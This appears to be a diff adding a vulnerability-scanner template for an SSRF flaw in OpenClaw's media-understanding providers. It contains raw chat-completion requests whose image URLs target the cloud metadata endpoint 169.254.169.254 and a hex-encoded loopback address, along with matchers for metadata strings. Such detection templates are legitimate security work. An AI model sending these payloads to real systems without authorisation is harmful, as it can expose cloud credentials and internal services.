@@ -1,0 +1,63 @@
+id: openclaw-media-ssrf
+
+info:
+  name: OpenClaw Media Understanding Provider SSRF (VULN-40)
+  author: LobsterGuard
+  severity: critical
+  description: |
+    Multiple AI providers (Deepgram, Google, OpenAI etc.) accept user-supplied
+    media URLs without sufficient SSRF protection. Attacker can reach cloud
+    metadata endpoints, internal services, and loopback addresses.
+    Source: media-understanding/providers/, media-understanding/runner.ts
+  tags: openclaw,ssrf,media,cloud,v4
+
+http:
+  - raw:
+      - |
+        POST /v1/chat/completions HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+
+        {"model":"probe","messages":[{"role":"user","content":[{"type":"text","text":"analyze"},{"type":"image_url","image_url":{"url":"http://169.254.169.254/latest/meta-data/"}}]}]}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "iam"
+        condition: or
+        part: body
+      - type: word
+        words:
+          - "ECONNREFUSED"
+          - "169.254"
+          - "metadata"
+        condition: or
+        part: body
+
+  - raw:
+      - |
+        POST /v1/chat/completions HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+
+        {"model":"probe","messages":[{"role":"user","content":[{"type":"text","text":"describe"},{"type":"image_url","image_url":{"url":"http://0x7f000001:18789/healthz"}}]}]}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        words:
+          - "ECONNREFUSED"
+          - "timeout"
+          - "connect"
+          - "healthz"
+        condition: or
+        part: body
